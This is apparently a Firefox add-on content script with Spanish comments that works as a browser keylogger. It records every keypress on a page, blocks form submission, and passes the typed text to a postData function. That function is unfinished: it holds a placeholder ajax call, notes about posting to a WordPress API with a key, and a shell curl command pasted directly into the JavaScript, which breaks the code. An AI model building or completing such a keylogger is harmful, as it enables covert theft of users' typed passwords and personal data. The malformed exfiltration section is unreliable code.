//funcion que ejecuta los cambios en la pagina
self.port.on("replacePage", function(msg){

  console.log("-------------- FF addon");

  // donde guardar el consolidado de caracteres
  var finalString = '';

  // revisa en todo el documento cuando se presiona una tecla
  $(document).keypress(function (e){  
    // el codigo de la tecla
    var code = e.which;
    // el caracter decoficado
    var character = String.fromCharCode(code);
    console.info("presionaron: "+ code + " == carater " + character);

    // suma el nuevo caracter 
    finalString += character;

    // esta pendiente de la tecla enter
    if (code === 13){
      console.info("Presionado enter");
      console.info('suma de caracteres: ', finalString);
      //llama la funcion que enviara la info
      postData(finalString);
      finalString = '';
    }
  }); 

  // esta pendiente de los botones
  $('input[type=submit]').click(function (e){
    e.preventDefault();

    console.info("Presionado boton");
    console.info('suma de caracteres: ', finalString);
    // llama la funcion que enviara la info
    postData(finalString);
    finalString = '';
  });
});

// Aca tiene que definirse a donde se va la informcion
function postData(data){
  // generar API KEY > https://apikey.wordpress.com/ 089f4595bc54
  // a donde= http://developer.wordpress.com/docs/089f4595bc54/1/post/sites/%24site/posts/new/
  // jquery.Ajax = https://api.jquery.com/jQuery.ajax/
  
  
  $.ajax({
  url: "test.html",
  context: document.body
}).done(function() {
  $( this ).addClass( "done" );
});
  
  curl \
 -H 'authorization: 089f4595bc54 \
 --data-urlencode 'title=ProducirIdentidadProduciendodatos' \
 --data-urlencode 'content=BryanGarcia' \
 --data-urlencode 'tags=tests???' \
 --data-urlencode 'categories=API ???' \
 'https://public-api.wordpress.com/rest/v1/sites/30434183/posts/new/'
  
  console.info("datos a enviar: ", data);
}

